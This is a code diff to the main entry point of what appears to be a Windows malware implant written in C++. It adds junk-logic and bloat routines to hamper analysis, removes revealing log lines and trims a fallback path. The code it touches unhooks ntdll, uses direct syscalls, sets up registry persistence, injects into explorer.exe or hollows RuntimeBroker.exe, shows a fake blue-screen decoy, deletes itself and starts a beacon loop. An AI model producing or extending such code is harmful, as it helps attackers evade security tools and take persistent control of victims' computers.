@@ -4,6 +4,8 @@
 #include "evasion/Syscalls.h"
 #include "evasion/Injector.h"
 #include "evasion/Detection.h"
+#include "evasion/JunkLogic.h"
+#include "evasion/Bloat.h"
 #include "decoy/BSOD.h"
 #include "utils/SelfDelete.h"
 #include "utils/Logger.h"
@@ -69,6 +71,8 @@ namespace {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
 
+    evasion::InitializeBloat();
+    evasion::JunkLogic::GenerateEntropy();
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
 
@@ -77,13 +81,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::wstring currentPath(currentPathBuf);
 
     LOG_INFO("--- WINMAIN ---");
-    LOG_INFO("Process Path: " + utils::ws2s(currentPath));
+
+    evasion::JunkLogic::PerformComplexMath();
 
     // Priority 1: Check if we are a Foothold (injected/hollowed)
     if (IsSystemProcess(currentPath)) {
         LOG_INFO("Detected Role: Foothold (Injected)");
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         (void)hr;
+
+        evasion::JunkLogic::ScrambleMemory();
 
         // Try to establish persistence from IPC path if available
         wchar_t dropperPath[MAX_PATH] = {0};
@@ -93,28 +100,27 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             DWORD sz = sizeof(dropperPath);
             if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
-                LOG_INFO("Foothold IPC: Source path found: " + utils::ws2s(dropperPath));
+                LOG_INFO("Foothold IPC: Source path found.");
                 persistence::establishPersistence(dropperPath);
             }
             RegCloseKey(hKey);
         } else {
-            LOG_INFO("Foothold IPC: Source path not found. Checking existing persistence...");
             persistence::ReinstallPersistence();
         }
 
-        LOG_INFO("Foothold: Starting beacon loop...");
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
         return 0;
     }
 
+    evasion::JunkLogic::GenerateEntropy();
+
     // Priority 2: Check if we are running from a persisted location
     if (IsRunningFromPersistLocation(currentPath)) {
         LOG_INFO("Detected Role: Persisted");
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
         (void)hr;
-
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
@@ -127,23 +133,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Behavioral Evasion
     int jitter = evasion::Detection::GetJitterDelay();
     if (jitter > 0) {
-        LOG_WARN("Evasion: EDR/AV detected. Jitter delay: " + std::to_string(jitter) + "s");
+        LOG_WARN("Evasion: Jitter delay active.");
         Sleep(jitter * 1000);
     } else {
-        Sleep(5000 + (GetTickCount() % 5000));
+        Sleep(3000 + (GetTickCount() % 5000));
     }
+
+    evasion::JunkLogic::PerformComplexMath();
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     (void)hr;
 
     // 1. Establish Persistence immediately from dropper
-    LOG_INFO("Dropper: Establishing initial persistence...");
-    std::wstring persistedPath = persistence::establishPersistence();
-    if (persistedPath.empty()) {
-        LOG_ERR("Dropper: Persistence failed.");
-    } else {
-        LOG_INFO("Dropper: Persistence established at " + utils::ws2s(persistedPath));
-    }
+    persistence::establishPersistence();
+
+    evasion::JunkLogic::ScrambleMemory();
 
     // 2. Store self path for Foothold IPC
     HKEY hKeyIPC;
@@ -154,19 +158,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         RegCloseKey(hKeyIPC);
     }
 
+    evasion::JunkLogic::GenerateEntropy();
+
     // 3. Attempt Relocation (Injection/Hollowing)
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
-        LOG_INFO("Dropper: Attempting in-memory relocation...");
-
         // Try explorer.exe first
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Dropper: Injection successful. Relocating to Foothold.");
-            decoy::ShowBSOD(); // Show decoy before cleaning up
+            decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
             return 0;
         }
+
+        evasion::JunkLogic::PerformComplexMath();
 
         // Try RuntimeBroker.exe hollowing
         wchar_t systemPath[MAX_PATH];
@@ -175,22 +180,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         std::wstring target = std::wstring(systemPath) + L"\\" + rb;
 
         if (evasion::Injector::HollowProcess(target, selfImage)) {
-            LOG_INFO("Dropper: Hollowing successful. Relocating to Foothold.");
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
             return 0;
-        }
-    }
-
-    // 4. Fallback: If relocation failed, ensure the persisted copy is running
-    LOG_WARN("Dropper: Relocation failed. Ensuring persisted copy is active.");
-    if (!persistedPath.empty() && lstrcmpiW(currentPathBuf, persistedPath.c_str()) != 0) {
-        STARTUPINFOW si; PROCESS_INFORMATION pi;
-        RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
-        if (CreateProcessW(persistedPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            LOG_INFO("Dropper: Persisted copy launched.");
         }
     }
 
